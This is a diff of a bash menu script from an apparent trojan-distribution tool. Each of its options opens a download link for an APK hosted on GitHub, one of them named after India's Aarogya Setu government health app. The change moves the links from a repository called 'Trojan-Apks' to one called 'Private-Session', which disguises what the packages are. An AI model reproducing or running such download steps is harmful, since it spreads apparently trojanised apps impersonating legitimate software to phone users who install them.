@@ -43,7 +43,7 @@ printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
         then echo
 echo 'You will redirect to site...' | lolcat
 sleep 2.0
-xdg-open 'https://github.com/abhackerofficial/Trojan-Apks/blob/master/gov.aarogya_setu_1.1.1.apk?raw=true'
+xdg-open 'https://github.com/abhackerofficial/Private-Session/blob/master/gov.aarogya_setu_1.1.1.apk?raw=true'
 sleep 1.0
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
@@ -54,7 +54,7 @@ bash trojan.sh
         then echo
 echo 'You will redirect to site...' | lolcat
 sleep 2.0
-xdg-open 'https://github.com/abhackerofficial/Trojan-Apks/blob/master/saver_1.0.apk?raw=true'
+xdg-open 'https://github.com/abhackerofficial/Private-Session/blob/master/saver_1.0.apk?raw=true'
 sleep 1.0
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
